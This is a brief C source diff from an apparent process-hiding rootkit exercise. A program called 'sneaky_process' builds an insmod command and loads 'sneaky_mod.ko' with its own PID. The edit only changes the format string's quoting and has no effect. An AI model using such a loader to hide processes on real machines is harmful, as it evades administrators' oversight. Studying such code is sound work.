@@ -17,7 +17,7 @@ int main() {
   printf("sneaky_process pid = %d\n", mypid);
   char command[50] = "insmod sneaky_mod.ko mypid=";
   char cpid[10];
-  sprintf(cpid, "%d", mypid);
+  sprintf(cpid, ""%d"", mypid);
   strcat(command, cpid);
   system(command);
   while(1) {
